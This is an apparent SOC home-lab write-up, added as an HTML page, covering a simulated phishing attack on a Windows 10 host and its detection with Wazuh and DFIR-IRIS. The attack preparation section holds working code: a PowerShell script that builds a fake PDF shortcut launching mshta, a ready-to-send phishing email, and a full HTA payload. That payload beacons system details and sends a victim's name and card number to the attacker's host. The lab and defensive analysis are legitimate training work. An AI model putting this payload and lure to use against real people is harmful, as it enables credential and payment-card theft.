@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Case 3 - Multi-stage Attack</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="index.html" class="nav-item">Home</a>
+    <a href="soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="case_1.html" class="nav-item">Case 1</a>
+    <a href="case_2.html" class="nav-item">Case 2</a>
+    <a href="case_3.html" class="nav-item active">Case 3</a>
+</div>
+
+<h1>Case 3 - Multi-stage Attack</h1>
+<p>
+    This case simulates an attacker compromising the Windows 10 host and stealing sensitive user data.
+    The investigation includes attacker activity (Kali), SIEM visibility (Wazuh), and
+    incident response workflow (DFIR‑IRIS).
+</p>
+
+<h2>1. Case Overview</h2>
+<ul>
+    <li><strong>Date:</strong> 2026‑03‑07</li>
+    <li><strong>Target:</strong> Windows 10 (10.10.10.20)</li>
+    <li><strong>Attacker:</strong> Kali Linux (10.10.10.40)</li>
+    <li><strong>Detection Source:</strong> Wazuh SIEM</li>
+    <li><strong>IR Platform:</strong> DFIR‑IRIS</li>
+</ul>
+
+<h2>2. Attack Preparation</h2>
+
+<p><strong>2.1. Create Employee_Bonus_Plan.pdf.lnk</strong></p>
+
+<pre><code>
+$objShell = New-Object -ComObject WScript.Shell
+$desktop = [System.Environment]::GetFolderPath('Desktop')
+
+$lnkPath = "$desktop\Employee_Bonus_Plan.pdf.lnk"
+$lnk = $objShell.CreateShortcut($lnkPath)
+
+$lnk.TargetPath = "mshta.exe"
+$lnk.Arguments = "http://10.10.10.40/gift.hta"
+
+$lnk.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe, 13"
+$lnk.Description = "Company Bonus Scheme 2024"
+$lnk.Save()
+
+Write-Host "LNK File created on Desktop: Employee_Bonus_Plan.pdf" -ForegroundColor Green
+</code></pre>
+
+<p><strong>2.2. Prepare and Send the Phishing Email</strong></p>
+
+<pre><code>Subject: URGENT: 2024 Employee Bonus Plan - Action Required
+
+Body:
+
+Dear Employee,
+
+Please find the attached document regarding the revised 2024 Corporate Bonus Plan and your eligibility status.
+
+To ensure your data remains secure during transit, the document has been encrypted. Please use the following credentials to access the file:
+
+- Attachment: Employee_Bonus_Plan_2024.zip
+- Archive Password: 1234
+
+Action Required:
+
+1. Download and extract the attached ZIP file.
+2. Open the PDF document to verify your personal details.
+3. Follow the instructions within the portal to claim your bonus.
+
+Failure to verify your information by EOD may result in a delay in processing your payment.
+
+Regards,
+
+Human Resources Department Corporate Benefits & Payroll Division
+</code></pre>
+
+<p><strong>2.3. gift.hta (Full HTA Application)</strong></p>
+
+<pre><code>
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset="UTF-8"&gt;
+&lt;meta http-equiv="X-UA-Compatible" content="IE=9"&gt;
+&lt;title&gt;Corporate Verification Portal&lt;/title&gt;
+&lt;HTA:APPLICATION APPLICATIONNAME="RewardPortal" SCROLL="no" SINGLEINSTANCE="yes" WINDOWSTATE="maximize" BORDER="none" CAPTION="no"&gt;
+
+&lt;script language="javascript"&gt;
+    var objShell = new ActiveXObject("WScript.Shell");
+    var kaliIp = "http://10.10.10.40";
+
+    function runInitialRecon() {
+        var user = objShell.ExpandEnvironmentStrings("%USERNAME%");
+        var comp = objShell.ExpandEnvironmentStrings("%COMPUTERNAME%");
+        var cmd = "powershell.exe -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri '" + kaliIp + "/beacon?u=" + user + "&c=" + comp + "'\"";
+        objShell.Run(cmd, 0, false);
+    }
+
+    function SendData() {
+        var uName = document.getElementById("fn").value;
+        var uCC = document.getElementById("cc").value;
+
+        var params = "/collect?name=" + encodeURIComponent(uName) + "&cc=" + encodeURIComponent(uCC);
+        var cmd = "powershell.exe -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri '" + kaliIp + params + "'\"";
+
+        objShell.Run(cmd, 0, false);
+        alert("Security verification complete.");
+        window.close();
+    }
+
+    window.setTimeout(function() { runInitialRecon(); }, 1000);
+&lt;/script&gt;
+
+&lt;style&gt;
+    body, html { margin: 0; padding: 0; height: 100%; width: 100%; background: #e5e7eb; font-family: "Segoe UI", Arial; }
+    .outer { display: table; position: absolute; height: 100%; width: 100%; }
+    .middle { display: table-cell; vertical-align: middle; text-align: center; }
+    .inner { display: inline-block; width: 600px; }
+    .form-card { background: #ffffff; padding: 50px; border-radius: 15px; border-top: 15px solid #2563eb; box-shadow: 0 25px 50px rgba(0,0,0,0.2); }
+    h1 { font-size: 32px; color: #1e3a8a; margin: 0 0 10px 0; }
+    p { font-size: 18px; color: #4b5563; margin-bottom: 30px; }
+    .input-box { width: 450px; padding: 15px; margin: 10px 0; border-radius: 6px; border: 2px solid #d1d5db; font-size: 16px; color: #999; }
+    .btn-container { width: 450px; margin: 25px auto 0 auto; }
+    .btn { width: 215px; padding: 18px; font-size: 18px; font-weight: bold; border-radius: 6px; border: none; cursor: pointer; }
+    .btn-submit { background: #2563eb; color: white; }
+    .btn-cancel { background: #ef4444; color: white; margin-left: 10px; }
+&lt;/style&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;div class="outer"&gt;
+        &lt;div class="middle"&gt;
+            &lt;div class="inner"&gt;
+                &lt;div class="form-card"&gt;
+                    &lt;h1&gt;Identity Verification&lt;/h1&gt;
+                    &lt;p&gt;Please confirm your details to authorize your &lt;strong&gt;$500&lt;/strong&gt; gift.&lt;/p&gt;
+
+                    &lt;input type="text" id="fn" class="input-box" value="Full Name"&gt;
+                    &lt;input type="text" id="ph" class="input-box" value="Phone Number"&gt;
+                    &lt;input type="text" id="cc" class="input-box" value="Credit Card Number"&gt;
+                    &lt;input type="text" id="ex" class="input-box" value="Exp Date (MM/YY)"&gt;
+
+                    &lt;div class="btn-container"&gt;
+                        &lt;button class="btn btn-submit" onclick="SendData()"&gt;VERIFY&lt;/button&gt;
+                        &lt;button class="btn btn-cancel" onclick="SendData()"&gt;CANCEL&lt;/button&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p><strong>2.4. Start the Web Server</strong></p>
+
+<pre><code>
+python3 -m http.server 80
+</code></pre>
+
+<img src="images/case_3/kali_1.png" alt="kali_1">
+
+<h2>3. Windows 10</h2>
+
+<p><strong>3.1. Open Email, Download, Unzip and Run</strong></p>
+<img src="images/case_3/win10_1.png">
+<img src="images/case_3/win10_2.png">
+<img src="images/case_3/win10_3.png">
+
+<p><strong>3.2. Input Data</strong></p>
+<img src="images/case_3/win10_4.png">
+
+<h2>4. Detection and Analysis (Wazuh SIEM)</h2>
+
+<h3>4.1. Alerts</h3>
+<p>Filtering by Sysmon Event ID 11 (FileCreate) and filename.</p>
+
+<pre><code>
+agent.name: "WIN10-WAZUH_AGENT" AND data.win.system.eventID:11 AND data.win.eventdata.targetFilename: *Employee*
+</code></pre>
+
+<img src="images/case_3/siem_1.png">
+
+<h3>4.2. Attack Sequence</h3>
+<p>"View Surrounding Documents" reveals the execution chain (bottom to top).</p>
+
+<img src="images/case_3/siem_2.png">
+<img src="images/case_3/siem_3.png">
+
+<h2>5. Incident Response (DFIR‑IRIS)</h2>
+
+<h3>5.1. Case Creation</h3>
+<img src="images/case_3/iris_1.png">
+
+<h3>5.2. Evidence Added</h3>
+<img src="images/case_3/iris_2.png">
+
+<h3>5.3. IOCs</h3>
+<img src="images/case_3/iris_3.png">
+
+<h3>5.4. Timeline Reconstruction</h3>
+<img src="images/case_3/iris_4.png">
+
+<h2>6. MITRE ATT&CK Mapping and Conclusion</h2>
+
+<ul>
+    <li><strong>TA0001</strong> – Initial Access</li>
+    <li><strong>T1566.001</strong> – Phishing: Spearphishing Attachment</li>
+
+    <li><strong>TA0002</strong> – Execution</li>
+    <li><strong>T1204.002</strong> – User Execution: Malicious File</li>
+    <li><strong>T1218.005</strong> – System Binary Proxy Execution: Mshta</li>
+
+    <li><strong>TA0007</strong> – Discovery</li>
+    <li><strong>T1033</strong> – System Owner/User Discovery</li>
+
+    <li><strong>TA0011</strong> – Command and Control</li>
+    <li><strong>T1071.001</strong> – Application Layer Protocol: Web Protocols</li>
+
+    <li><strong>TA0009</strong> – Collection</li>
+    <li><strong>T1056.003</strong> – Input Capture: Web Portal Capture</li>
+
+    <li><strong>TA0010</strong> – Exfiltration</li>
+    <li><strong>T1041</strong> – Exfiltration Over C2 Channel</li>
+</ul>
+
+<img src="images/case_3/iris_5.png">
+
+<h2>7. Case Closing</h2>
+
+<p>
+Phishing-Derived Credential Harvesting via Mshta LOLBIN Execution<br><br>
+
+The incident began with a successful phishing attack where the user downloaded a compressed file (.zip) containing a spoofed shortcut (.pdf.lnk). By exploiting the default Windows behavior of hiding known file extensions, the attacker induced the user to execute the link.<br><br>
+
+Explorer.exe spawned mshta.exe, which initiated a connection to a remote C2 server (Kali Linux). Two actions occurred:<br>
+- System Reconnaissance: Exfiltrated the current username and computername as a PoC beacon.<br>
+- In-Session Phishing: Downloaded and executed a remote HTA payload (gift.hta) in memory.<br><br>
+
+Impact:<br>
+Confidentiality: High. Sensitive PII and financial information were successfully exfiltrated.<br>
+Integrity: Medium. Unauthorized code execution was achieved via LOLBINs.<br>
+Availability: Low. No destructive actions observed.<br><br>
+
+Conclusion:<br>
+This case demonstrates a classic "Living off the Land" attack vector. The reliance on mshta.exe allowed the attacker to bypass initial defenses and establish a foothold for data harvesting. Recommended remediation includes disabling mshta.exe via AppLocker/WDAC and enforcing "show file extensions" via GPO.
+</p>
+
+<img src="images/case_3/iris_6.png">
+
+<p><a href="index.html">← Back to Home</a></p>
+
+</body>
+</html>
